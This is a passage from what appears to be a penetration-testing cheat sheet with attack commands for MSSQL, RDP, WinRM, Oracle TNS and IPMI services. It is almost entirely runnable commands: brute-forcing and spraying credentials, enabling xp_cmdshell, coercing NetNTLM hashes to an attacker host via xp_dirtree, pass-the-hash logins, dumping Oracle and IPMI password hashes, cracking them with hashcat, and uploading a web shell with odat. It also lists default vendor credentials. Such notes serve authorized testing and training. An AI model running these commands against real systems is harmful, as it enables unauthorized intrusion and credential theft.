- Brute-force credentials using Nmap:

```bash
nmap -p 1433 --script ms-sql-brute --script-args userdb=usernames.txt,passdb=/usr/share/wordlists/rockyou.txt 10.10.11.5
```

### Interacting with MSSQL

>[!note] See [[MSSQL#Connecting to MSSQL]].

- Connect with SQL Server authentication using Impacket's `mssqlclient.py`:

```bash
mssqlclient.py sa:'passwd123'@10.10.11.5
```

- Connect with Windows authentication using `mssqlclient.py`:

```bash
mssqlclient.py jdoe@10.10.11.5 -windows-auth
```

- Enable `xp_cmdshell` and run an operating-system command:

```sql
SQL> enable_xp_cmdshell
EXEC xp_cmdshell 'whoami';
```

- Coerce the service account into leaking its NetNTLM hash to an attacker-controlled host:

```sql
EXEC master..xp_dirtree '\\<attacker_ip_address>\share';
```

## RDP

>[!note] See [[RDP]].

### Enumerating RDP

- Perform service version detection on the default RDP port:

```bash
sudo nmap -sV -p 3389 10.10.11.5
```

- Run default RDP NSE scripts:

```bash
sudo nmap -sV -sC -p 3389 10.10.11.5
```

- Run all available RDP NSE scripts:

```bash
nmap -p 3389 --script "rdp-*" 10.10.11.5
```

>[!note]- Common Nmap RDP scripts
> 
> | Script | Categories | Description |
> | :--- | :--- | :--- |
> | [`rdp-enum-encryption`](https://nmap.org/nsedoc/scripts/rdp-enum-encryption.html) | `discovery`, `safe` | Determine the supported RDP security layers and encryption levels. |
> | [`rdp-ntlm-info`](https://nmap.org/nsedoc/scripts/rdp-ntlm-info.html) | `discovery`, `safe` | Enumerate NTLM information (domain, hostname, OS build) from NLA-enabled services. |
> | [`rdp-vuln-ms12-020`](https://nmap.org/nsedoc/scripts/rdp-vuln-ms12-020.html) | `vuln`, `safe` | Check whether the target is vulnerable to `MS12-020`. |

>[!tip]+
> - List local Nmap scripts for RDP:
> 
> ```bash
> ls -l /usr/share/nmap/scripts/*rdp*
> ```

- Determine the supported encryption and retrieve NTLM information:

```bash
nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info 10.10.11.5
```

- Enumerate usernames via valid/invalid response differences using [`crowbar`](https://github.com/galkan/crowbar):

```bash
crowbar -b rdp -s 10.10.11.5/32 -u usernames.txt -C /usr/share/wordlists/rockyou.txt
```

- List active RDP sessions on a remote host (with valid credentials):

```powershell
qwinsta /server:10.10.11.5
```

### Brute-forcing credentials

- Brute-force RDP credentials using Hydra:

```bash
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.11.5
```

- Brute-force RDP credentials using Medusa:

```bash
medusa -M rdp -h 10.10.11.5 -u Administrator -P /usr/share/wordlists/rockyou.txt -e ns
```

- Brute-force RDP credentials using `crowbar` (handles NLA better than Hydra in some configurations):

```bash
crowbar -b rdp -s 10.10.11.5/32 -u Administrator -C /usr/share/wordlists/rockyou.txt
```

### Interacting with RDP

>[!note] See [[RDP#Connecting over RDP]] and [[Privileged remote access#RDP]].

- Connect to a Windows host from Linux:

```bash
xfreerdp /v:10.10.11.5 /u:jdoe /p:'passwd123' /cert:ignore
```

- Enable clipboard redirection and dynamic resolution:

```bash
xfreerdp /v:10.10.11.5 /u:jdoe /p:'passwd123' /dynamic-resolution +clipboard /cert:ignore
```

- Authenticate with an NT hash in Restricted Admin Mode ([[Pass-the-Hash]]):

```bash
xfreerdp /v:10.10.11.5 /u:Administrator /pth:2b576acfd5e0c865136732c44b49b6b1 /restricted-admin /cert:ignore
```

## WinRM

>[!note] See [[WinRM]].

### Enumerating WinRM

- Perform service version detection on the default WinRM ports:

```bash
sudo nmap -sV -p 5985,5986 10.10.11.5
```

- Run version detection together with the default NSE scripts:

```bash
sudo nmap -sV -sC -p 5985,5986 10.10.11.5
```

- Probe the WS-Man listener and confirm the service using NetExec:

```bash
nxc winrm 10.10.11.5 -u '' -p ''
```

- Verify the remote WinRM service responds from a Windows host:

```powershell
Test-WSMan -ComputerName 10.10.11.5
```

### Brute-forcing credentials

- Perform password spraying across a list of usernames using NetExec:

```bash
nxc winrm 10.10.11.5 -u usernames.txt -p 'passwd123' --no-bruteforce
```

- Brute-force the password for a single user using NetExec:

```bash
nxc winrm 10.10.11.5 -u jdoe -p /usr/share/wordlists/rockyou.txt
```

### Interacting with WinRM

>[!note] See [[WinRM#Connecting to WinRM]] and [[Privileged remote access#WinRM]].

- Establish an interactive PowerShell session with a password:

```bash
evil-winrm -i 10.10.11.5 -u jdoe -p 'passwd123'
```

- Authenticate using an NT hash ([[Pass-the-Hash]]):

```bash
evil-winrm -i 10.10.11.5 -u jdoe -H 2b576acfd5e0c865136732c44b49b6b1
```

- Connect over the HTTPS listener on port `5986`:

```bash
evil-winrm -i 10.10.11.5 -u jdoe -p 'passwd123' -S
```

## Oracle TNS

>[!note] See [[Oracle TNS]].

### Enumerating the TNS listener

- Perform service version detection on the default TNS port:

```bash
sudo nmap -sV -p 1521 10.10.11.5 --open
```

- Run all available Oracle TNS NSE scripts:

```bash
sudo nmap -sV -p 1521 --script "oracle-*" 10.10.11.5 --open
```

>[!tip]+
> - List local Nmap scripts for Oracle TNS:
> 
> ```bash
> ls -l /usr/share/nmap/scripts/*oracle*
> ```

- Brute-force valid SIDs with the `oracle-sid-brute` NSE script:

```bash
sudo nmap -sV -p 1521 --script oracle-sid-brute 10.10.11.5 --open
```

- Guess SIDs with `odat`:

```bash
./odat.py sidguesser -s 10.10.11.5 -p 1521
```

- Run all `odat` modules to enumerate SIDs, versions, accounts, and misconfigurations:

```bash
./odat.py all -s 10.10.11.5
```

### Brute-forcing credentials

- Guess database credentials for a known SID with `odat`:

```bash
./odat.py passwordguesser -s 10.10.11.5 -d XE
```

>[!tip]+ Try known Oracle defaults first: `scott:tiger`, `system:CHANGE_ON_INSTALL`, and `dbsnmp:dbsnmp`.

### Interacting with Oracle TNS

>[!note] See [[Oracle TNS#Connecting to the database]].

- Connect to an instance with `sqlplus`:

```bash
sqlplus scott/tiger@10.10.11.5/XE
```

- Connect as the System Database Administrator (`sysdba`):

```bash
sqlplus scott/tiger@10.10.11.5/XE as sysdba
```

- Extract password hashes for offline cracking:

```sql
SELECT name, password FROM sys.user$;
```

- Upload a file (for example, a web shell into a web root) with the `utlfile` module:

```bash
./odat.py utlfile -s 10.10.11.5 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot shell.aspx ./shell.aspx
```

## IPMI

>[!note] See [[IPMI]].

### Enumerating IPMI

- Detect the service and fingerprint its version with the `ipmi-version` NSE script over UDP:

```bash
sudo nmap -sU --script ipmi-version -p 623 10.10.11.5
```

- Check for the IPMI 2.0 cipher zero authentication bypass:

```bash
sudo nmap -sU --script ipmi-cipher-zero -p 623 10.10.11.5
```

- Fingerprint the protocol version with Metasploit:

```bash
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_version; set rhosts 10.10.11.5; run; exit"
```

>[!tip]+
> - List local Nmap scripts for IPMI:
> 
> ```bash
> ls -l /usr/share/nmap/scripts/*ipmi*
> ```

>[!tip]+ Try known BMC defaults on any web/SSH/Telnet interface: `root:calvin` (Dell iDRAC) and `ADMIN:ADMIN` (Supermicro IPMI).

### Dumping and cracking hashes

- Retrieve RAKP password hashes with the Metasploit `ipmi_dumphashes` module (also auto-cracks against a built-in wordlist):

```bash
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set rhosts 10.10.11.5; run; exit"
```

- Crack retrieved IPMI 2.0 RAKP hashes with [[Hashcat]] (mode `7300`):

```bash
hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt
```

- Brute-force a factory-default HP iLO password (8 characters, digits and uppercase) with a mask attack:

```bash
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```
